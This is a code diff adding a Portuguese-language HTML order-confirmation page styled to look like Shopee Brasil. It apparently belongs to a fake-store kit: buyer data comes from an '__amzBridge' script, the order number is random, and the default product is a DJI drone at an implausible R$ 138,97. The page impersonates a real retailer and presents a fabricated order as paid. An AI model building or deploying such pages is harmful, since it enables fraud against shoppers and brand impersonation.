@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pedido Confirmado | Shopee Brasil</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --shopee-orange: #ee4d2d;
+            --shopee-gradient: linear-gradient(181deg, rgb(245, 63, 45), rgb(254, 99, 50) 87%);
+            --bg-gray: #f5f5f5;
+            --text-main: #222;
+            --text-secondary: #757575;
+            --border-color: #e8e8e8;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-gray);
+            color: var(--text-main);
+            line-height: 1.4;
+        }
+
+        header {
+            background: #fff;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        header img {
+            height: 40px;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 15px;
+        }
+
+        .success-card {
+            background: #fff;
+            border-radius: 4px;
+            padding: 40px 20px;
+            text-align: center;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.05);
+            margin-bottom: 15px;
+        }
+
+        .check-icon {
+            width: 70px;
+            height: 70px;
+            background: #26aa99;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin: 0 auto 20px;
+        }
+
+        .success-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .success-subtitle {
+            color: var(--text-secondary);
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .order-details {
+            background: #fff;
+            border-radius: 4px;
+            padding: 20px;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.05);
+            margin-bottom: 15px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+            text-transform: uppercase;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .detail-label {
+            color: var(--text-secondary);
+        }
+
+        .detail-value {
+            font-weight: 500;
+            text-align: right;
+            max-width: 60%;
+        }
+
+        .shipping-status {
+            background: #fffcf5;
+            border: 1px solid #ffb80033;
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 15px;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .shipping-icon {
+            font-size: 24px;
+            color: #ffb800;
+        }
+
+        .shipping-text h4 {
+            font-size: 14px;
+            margin-bottom: 4px;
+            color: #c45500;
+        }
+
+        .shipping-text p {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .actions {
+            margin-top: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 48px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-primary {
+            background: var(--shopee-gradient);
+            color: #fff;
+            border: none;
+        }
+
+        .btn-secondary {
+            background: #fff;
+            color: var(--text-main);
+            border: 1px solid var(--border-color);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            color: var(--text-secondary);
+            font-size: 12px;
+        }
+
+        @media (max-width: 480px) {
+            header { height: 60px; }
+            header img { height: 30px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Shopee">
+    </header>
+
+    <div class="container">
+        <div class="success-card">
+            <div class="check-icon">✓</div>
+            <h1 class="success-title">Pedido Pago com Sucesso!</h1>
+            <p class="success-subtitle">Obrigado por sua compra. Seu pedido já está sendo processado.</p>
+            
+            <div class="shipping-status">
+                <div class="shipping-icon">🚚</div>
+                <div class="shipping-text">
+                    <h4>Status: Preparando para envio</h4>
+                    <p>O vendedor foi notificado e está preparando seu pacote.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="order-details">
+            <h2 class="section-title">Informações do Pedido</h2>
+            <div class="detail-row">
+                <span class="detail-label">Número do Pedido:</span>
+                <span class="detail-value" id="order-number">...</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Data:</span>
+                <span class="detail-value" id="order-date">...</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Cliente:</span>
+                <span class="detail-value" id="customer-name">...</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Endereço:</span>
+                <span class="detail-value" id="delivery-address">...</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Produto:</span>
+                <span class="detail-value" id="product-name">...</span>
+            </div>
+            <div class="detail-row" style="margin-top: 10px; border-top: 1px dashed #eee; padding-top: 10px;">
+                <span class="detail-label" style="font-weight: 700; color: #000;">Total Pago:</span>
+                <span class="detail-value" id="total-amount" style="color: var(--shopee-orange); font-weight: 700; font-size: 16px;">...</span>
+            </div>
+        </div>
+
+        <div class="actions">
+            <a href="/" class="btn btn-primary">VER MEUS PEDIDOS</a>
+            <a href="/" class="btn btn-secondary">CONTINUAR COMPRANDO</a>
+        </div>
+
+        <div class="footer">
+            <p>© 2026 Shopee. Todos os direitos reservados.</p>
+        </div>
+    </div>
+
+    <script src="assets/js/supabase-bridge.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const state = window.__amzBridge ? await window.__amzBridge.getState() : {};
+            const buyer = state.buyer || state || {};
+
+            function pick(...values) {
+                return values.find(v => v !== undefined && v !== null && String(v).trim() !== '') || '';
+            }
+
+            // Populate fields
+            document.getElementById('customer-name').textContent = pick(buyer.name, buyer.nome, 'Cliente');
+            
+            const addressStr = [
+                pick(buyer.street, buyer.rua),
+                pick(buyer.number, buyer.numero),
+                pick(buyer.neighborhood, buyer.bairro),
+                pick(buyer.city, buyer.cidade),
+                pick(buyer.state, buyer.estado)
+            ].filter(Boolean).join(', ');
+            document.getElementById('delivery-address').textContent = addressStr || 'Endereço em processamento';
+
+            const orderNum = pick(state.order_id, state.matched_event_object_id, '2604' + Math.floor(Math.random() * 1000000));
+            document.getElementById('order-number').textContent = orderNum;
+            
+            document.getElementById('order-date').textContent = new Date().toLocaleDateString('pt-BR');
+            
+            document.getElementById('product-name').textContent = pick(buyer.productName, state.productName, 'Drone DJI Mini 4 Pro');
+            
+            const total = pick(state.totalAmount, state.amount, buyer.amount, '138,97');
+            document.getElementById('total-amount').textContent = typeof total === 'number' 
+                ? total.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })
+                : (total.includes('R$') ? total : 'R$ ' + total);
+        });
+    </script>
+</body>
+</html>
